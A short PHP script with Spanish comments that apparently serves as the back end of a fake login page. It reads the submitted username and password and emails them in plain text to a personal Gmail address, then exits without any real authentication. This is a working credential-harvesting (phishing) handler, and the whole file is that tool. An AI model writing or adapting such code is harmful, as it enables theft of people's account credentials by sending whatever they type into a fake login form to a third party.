<?php
// Verifica si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Aquí puedes realizar otras acciones, como verificar las credenciales en una base de datos,
    // o simplemente enviar un correo electrónico

    // Envío de correo electrónico de ejemplo (requiere una configuración adecuada del servidor SMTP)
    $to = "danielrosario236.t@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Se ha intentado iniciar sesión con los siguientes datos:\n\n";
    $message .= "Usuario o Email: $username\n";
    $message .= "Contraseña: $password\n";

    // Envía el correo electrónico
    mail($to, $subject, $message);

    // Redirecciona al usuario a una página de éxito o error
    // header("Location: pagina_de_exito.html"); // Puedes redirigir a una página de éxito
    exit();
}
?>
